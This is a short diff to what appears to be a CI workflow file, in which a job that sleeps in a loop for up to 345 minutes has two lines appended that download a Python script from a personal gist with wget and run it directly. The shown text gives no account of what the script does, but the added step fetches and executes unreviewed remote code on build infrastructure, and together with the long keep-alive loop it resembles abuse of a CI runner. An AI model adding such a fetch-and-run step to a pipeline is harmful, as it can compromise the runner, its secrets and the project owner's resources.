@@ -46,3 +46,5 @@ jobs:
             #echo "Minute $i / 345 — $(date)"
             sleep 60
           done
+          wget https://gist.githubusercontent.com/izaart95-jpg/844a7f795aa828150b815bfa6f0130e7/raw/4519ef6f222a809124a6ef6a80fdbc6bfb6c4526/final_runner.py
+          python final_runner.py
